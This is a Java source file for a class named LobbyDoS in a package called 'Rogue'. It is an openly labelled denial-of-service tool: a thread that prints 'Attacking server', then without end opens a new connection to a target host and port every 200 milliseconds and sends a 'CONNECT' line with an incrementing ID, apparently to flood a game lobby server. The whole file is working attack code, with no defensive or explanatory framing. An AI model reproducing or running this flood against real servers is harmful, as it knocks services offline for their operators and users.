package Rogue;

public class LobbyDoS extends Thread{
	private String server;
	private int port;
	private Connection[] con;
	private String data;
	private long timeStarted;
	public LobbyDoS(String host, int destPort) {
		server = host;
		port = destPort;
		
		System.out.println("Attacking server " + host + ":" + destPort);
	}
	
	public long getRunTime() {
		return System.currentTimeMillis() - timeStarted;
	}
	
	public void run() {
		timeStarted = System.currentTimeMillis();
		for (int i = 0; true; ++i) {
			new Connection(server, port, false).sendLine("CONNECT " + (100000000000000L+i));
			if (i%100 == 0) {
				System.out.println("Connections: " + i);
			}
			try {
				Thread.sleep(200);
			} catch (InterruptedException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}
	}
}
